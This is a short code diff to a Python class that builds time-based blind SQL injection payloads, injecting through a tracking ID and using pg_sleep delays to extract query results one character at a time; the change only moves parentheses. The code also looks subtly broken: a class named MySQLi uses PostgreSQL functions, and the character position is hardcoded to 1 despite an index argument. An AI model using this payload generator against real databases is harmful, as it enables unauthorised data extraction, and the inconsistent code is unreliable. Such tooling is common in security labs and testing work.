@@ -34,9 +34,9 @@ class MySQLi(SQLi):
         
     def format_char_query(self, inner_query, index, char):
         return(
-            f"{self.tracking_id}'||(SELECT CASE WHEN (("
-            f"select SUBSTRING(({inner_query}),1,1))=chr({char}))"
-            " THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END)--"
+            f"{self.tracking_id}'||(SELECT CASE WHEN ("
+            f"(select SUBSTRING(({inner_query}),1,1))=chr({char})"
+            ") THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END)--"
         )
     def is_true(self, resp, duration):
         if duration > SLEEP:
